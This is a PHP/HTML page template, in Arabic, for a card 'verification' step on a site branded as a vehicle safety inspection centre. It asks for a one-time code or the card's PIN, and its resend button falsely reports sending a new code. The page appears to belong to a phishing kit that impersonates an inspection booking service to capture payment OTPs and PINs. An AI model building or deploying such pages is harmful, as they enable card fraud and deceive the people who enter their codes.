تكن هناك أخطاء، معالجة التحقق
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title><?php echo $verification_title; ?> | مركز سلامة المركبات</title>

    <!-- Meta -->
    <meta name="description" content="أدخل <?php echo $verification_title; ?> لإتمام عملية الدفع" />
    <meta property="og:title" content="<?php echo $verification_title; ?> | مركز سلامة المركبات" />
    <meta property="og:description" content="أدخل <?php echo $verification_title; ?> لإتمام عملية الدفع" />
    <meta name="theme-color" content="#0ea5a5" />

    <!-- Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Font Awesome -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">

    <style>
        :root{--primary:#0ea5a5;--primary-600:#0c8e8e;--ink:#0f172a;--muted:#64748b;--line:#e5e7eb;--bg:#ffffff;--soft:#f8fafc;--radius:16px;--success:#10b981;--error:#ef4444;}
        *{box-sizing:border-box} html,body{margin:0}
        body{font-family:"Cairo",system-ui,sans-serif;line-height:1.65;color:var(--ink);background:var(--bg);scroll-behavior:smooth}
        a{text-decoration:none;color:inherit} img{max-width:100%;display:block}
        .container{width:min(1400px,100% - 16px);margin-inline:auto}

        /* Header */
        .booking-header{position:sticky;top:0;z-index:50;background:rgba(255,255,255,.95);backdrop-filter:blur(10px);border-bottom:1px solid var(--line);box-shadow:0 2px 20px rgba(0,0,0,.05)}
        .header-content{display:flex;align-items:center;justify-content:flex-start;height:80px;padding:0 1rem}
        .logo-section{display:flex;align-items:center}
        .logo-link{display:flex;align-items:center;gap:1rem;text-decoration:none;color:var(--ink);transition:transform .3s ease}
        .logo-link:hover{transform:scale(1.02)}
        .logo-img{height:48px;width:auto;transition:transform .3s ease}
        .logo-link:hover .logo-img{transform:scale(1.05)}
        .logo-text{display:flex;flex-direction:column;gap:.1rem}
        .brand-name{font-size:1.5rem;font-weight:900;color:var(--primary);line-height:1}
        .service-name{font-size:.85rem;color:var(--muted);font-weight:600;line-height:1}

        /* Main Container */
        .verification-container{max-width:820px;margin:2rem auto;background:#fff;border:1px solid var(--line);border-radius:var(--radius);padding:2rem;box-shadow:0 8px 32px rgba(0,0,0,.06)}
        
        /* Title */
        .title .lin-1{color:var(--muted);margin:0;font-size:1rem}
        .title .lin-2{font-size:2rem;font-weight:900;margin:0;color:var(--ink)}
        .title .lin-2 span{color:var(--primary)}
        .title .lin-3{color:var(--muted);font-weight:600;margin-top:0.5rem}

        /* Card Info */
        .card-info{background:linear-gradient(135deg,var(--soft),#f1f5f9);border:2px solid var(--line);border-radius:16px;padding:1.5rem;margin:1.5rem 0;box-shadow:0 4px 12px rgba(0,0,0,.05)}
        .card-info h3{color:var(--primary);font-size:1.1rem;font-weight:700;margin-bottom:0.5rem;display:flex;align-items:center;gap:0.5rem}
        .card-info p{color:var(--ink);font-size:0.95rem;margin:0}

        /* Error Messages */
        .alert-error{background:#fff5f5;border:1px solid #fecaca;color:#b91c1c;border-radius:12px;padding:1rem;margin-bottom:1.5rem}
        .error-item{display:flex;align-items:center;gap:0.5rem;margin-bottom:0.5rem}
        .error-item:last-child{margin-bottom:0}

        /* Verification Form */
        .section-title{font-size:1.2rem;font-weight:800;margin:1.2rem 0 .8rem;color:var(--ink);display:flex;gap:.5rem;align-items:center}
        
        /* Verification Input */
        .form-group{margin:2rem 0}
        .verification-input{
            width:100%;
            height:60px;
            text-align:center;
            font-size:1.5rem;
            font-weight:700;
            border:2px solid var(--line);
            border-radius:12px;
            background:white;
            transition:all 0.3s ease;
            outline:none;
            letter-spacing:0.5rem;
            padding:0 1rem;
        }
        .verification-input:focus{
            border-color:var(--primary);
            box-shadow:0 0 0 3px rgba(14, 165, 165, 0.1);
            transform:scale(1.02);
        }
        .verification-input.valid{
            border-color:var(--success);
            background:rgba(16, 185, 129, 0.05);
            color:var(--primary);
        }
        .verification-input.error{
            border-color:var(--error);
            background:rgba(239, 68, 68, 0.05);
            animation:inputShake 0.5s ease-in-out;
        }

        @keyframes inputShake{
            0%, 100%{transform:translateX(0)}
            25%{transform:translateX(-5px)}
            75%{transform:translateX(5px)}
        }

        /* Timer */
        .timer{text-align:center;margin:1rem 0;color:var(--muted);font-size:0.9rem}
        .timer.expired{color:var(--error);font-weight:600}
        #countdown{font-weight:700;color:var(--primary)}

        /* Buttons */
        .btn-full{width:100%}
        .btn-primary{background:var(--primary);color:white;border:none;padding:1rem 2rem;border-radius:12px;font-size:1rem;font-weight:600;cursor:pointer;transition:all 0.3s ease;margin-bottom:1rem}
        .btn-primary:hover{background:var(--primary-600);transform:translateY(-2px)}
        .btn-secondary{background:transparent;color:var(--primary);border:2px solid var(--primary);padding:1rem 2rem;border-radius:12px;font-size:1rem;font-weight:600;cursor:pointer;transition:all 0.3s ease}
        .btn-secondary:hover{background:var(--primary);color:white}
        .btn:disabled{opacity:0.6;cursor:not-allowed;transform:none !important}

        /* Loading State */
        .spinner{display:inline-block;width:20px;height:20px;border:2px solid rgba(255, 255, 255, 0.3);border-radius:50%;border-top-color:white;animation:spin 1s ease-in-out infinite}
        @keyframes spin{to{transform:rotate(360deg)}}

        /* Footer */
        footer{background:linear-gradient(135deg,#0f172a,#1e293b);color:#fff;padding:2rem 1rem;text-align:center;margin-top:2rem}
        footer::before{content:'';display:block;height:4px;background:linear-gradient(90deg,var(--primary),var(--primary-600));margin:-2rem 0 1.5rem}

        /* Responsive Design */
        @media (max-width: 768px) {
            .verification-container{padding:2rem;margin:1rem}
            .code-container{gap:0.5rem;margin:1.5rem 0}
            .code-input{width:45px;height:45px;font-size:1.2rem}
        }
        @media (max-width: 480px) {
            .verification-container{padding:1.5rem}
            .code-input{width:40px;height:40px;font-size:1.1rem}
        }
    </style>
</head>

<body>
    <!-- Header -->
    <header class="booking-header">
        <div class="container">
            <div class="header-content">
                <div class="logo-section">
                    <a href="/" class="logo-link">
                        <div class="logo-text">
                            <div class="brand-name">سلامة</div>
                            <div class="service-name">مركز الفحص الفني</div>
                        </div>
                    </a>
                </div>
            </div>
        </div>
    </header>

    <div class="container">
        <div class="verification-container">
            <!-- Title -->
            <div class="title">
                <p class="lin-1">خطوة 3 من 5</p>
                <h1 class="lin-2"><?php echo $verification_title; ?></h1>
                <p class="lin-3"><?php echo $verification_description; ?></p>
            </div>

            <!-- Card Info -->
            <div class="card-info">
                <h3>
                    <i class="fas fa-credit-card"></i>
                    بيانات البطاقة
                </h3>
                <p>البطاقة المنتهية بـ: <strong>****<?php echo $_SESSION['payment']['last4'] ?? '****'; ?></strong></p>
            </div>

            <!-- Error Messages -->
            <?php if (!empty($errors)): ?>
                <div class="alert-error">
                    <?php foreach ($errors as $error): ?>
                        <div class="error-item">
                            <i class="fas fa-exclamation-circle"></i>
                            <?php echo htmlspecialchars($error); ?>
                        </div>
                    <?php endforeach; ?>
                </div>
            <?php endif; ?>

            <!-- Verification Form -->
            <form method="POST" id="verificationForm">
                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf']; ?>">
                
                <h3 class="section-title">
                    <i class="fas <?php echo $verification_type === 'otp' ? 'fa-mobile-alt' : 'fa-credit-card'; ?>"></i>
                    <?php echo $verification_title; ?>
                </h3>

                <?php if ($verification_type === 'otp'): ?>
                    <div class="timer" id="timer">
                        الرمز صالح لمدة: <span id="countdown">05:00</span>
                    </div>
                <?php endif; ?>

                <div class="form-group">
                    <input type="password" 
                           id="verificationCode" 
                           name="verification_code" 
                           class="form-control verification-input" 
                           maxlength="<?php echo $verification_length; ?>"
                           pattern="[0-9]{<?php echo $verification_length; ?>}"
                           required>
                </div>

                <button type="submit" class="btn-primary btn-full" id="submitBtn">
                    <i class="fas fa-check"></i>
                    تأكيد <?php echo $verification_title; ?>
                </button>

                <?php if ($verification_type === 'otp'): ?>
                    <button type="button" class="btn-secondary btn-full" id="resendBtn">
                        <i class="fas fa-redo"></i>
                        إعادة إرسال الرمز
                    </button>
                <?php endif; ?>
            </form>
        </div>
    </div>

    <!-- Footer -->
    <footer>
        <div class="container">
            <p>&copy; 2024 مركز سلامة للفحص الفني. جميع الحقوق محفوظة.</p>
        </div>
    </footer>

    <script>
        // Verification Code Input handling
        const verificationInput = document.getElementById('verificationCode');
        const form = document.getElementById('verificationForm');
        const submitBtn = document.getElementById('submitBtn');
        const resendBtn = document.getElementById('resendBtn');
        const verificationType = '<?php echo $verification_type; ?>';
        const verificationLength = <?php echo $verification_length; ?>;

        // Timer functionality for OTP
        if (verificationType === 'otp') {
            let timeLeft = 300; // 5 minutes
            const timerElement = document.getElementById('timer');
            const countdownElement = document.getElementById('countdown');

            const timer = setInterval(() => {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;

                if (timeLeft <= 0) {
                    clearInterval(timer);
                    timerElement.classList.add('expired');
                    timerElement.textContent = 'انتهت صلاحية الرمز';
                    submitBtn.disabled = true;
                    if (resendBtn) {
                        resendBtn.innerHTML = '<i class="fas fa-redo"></i> إعادة إرسال الرمز';
                        resendBtn.disabled = false;
                    }
                }
                timeLeft--;
            }, 1000);
        }

        // Input handling
        verificationInput.addEventListener('input', function(e) {
            let value = e.target.value;

            // Only allow numbers
            value = value.replace(/\D/g, '');
            
            // Limit to verification length
            if (value.length > verificationLength) {
                value = value.slice(0, verificationLength);
            }
            
            e.target.value = value;
            updateInputStyles();
        });

        verificationInput.addEventListener('keypress', function(e) {
            // Only allow numbers
            if (!/[0-9]/.test(e.key) && !['Backspace', 'Delete', 'Tab', 'Enter'].includes(e.key)) {
                e.preventDefault();
            }
        });

        function updateInputStyles() {
            verificationInput.classList.remove('valid', 'error');
            
            if (verificationInput.value.length === verificationLength) {
                verificationInput.classList.add('valid');
            }
        }

        // Resend functionality
        if (resendBtn) {
            resendBtn.addEventListener('click', function() {
                // Reset timer
                if (verificationType === 'otp') {
                    timeLeft = 300;
                    document.getElementById('timer').classList.remove('expired');
                    document.getElementById('timer').innerHTML = 'الرمز صالح لمدة: <span id="countdown">05:00</span>';
                    submitBtn.disabled = false;
                }

                // Clear input
                verificationInput.value = '';
                verificationInput.classList.remove('valid', 'error');

                // Show success message
                alert('تم إرسال رمز جديد');
                verificationInput.focus();
            });
        }

        // Form submission
        form.addEventListener('submit', function(e) {
            const codeValue = verificationInput.value;

            if (codeValue.length !== verificationLength) {
                e.preventDefault();
                alert(`يرجى إدخال ${verificationType === 'otp' ? 'رمز OTP' : 'رمز PIN'} المكون من ${verificationLength} أرقام`);
                verificationInput.classList.add('error');
                verificationInput.focus();
                return;
            }

            if (!/^\d+$/.test(codeValue)) {
                e.preventDefault();
                alert(`${verificationType === 'otp' ? 'رمز OTP' : 'رمز PIN'} يجب أن يحتوي على أرقام فقط`);
                verificationInput.classList.add('error');
                verificationInput.focus();
                return;
            }

            // Show loading state
            submitBtn.innerHTML = '<span class="spinner"></span> جاري التحقق...';
            submitBtn.disabled = true;
        });

        // Focus input on load
        verificationInput.focus();

        // Add error animation if there are errors
        <?php if (!empty($errors)): ?>
            verificationInput.classList.add('error');
        <?php endif; ?>
    </script>
</body>
</html>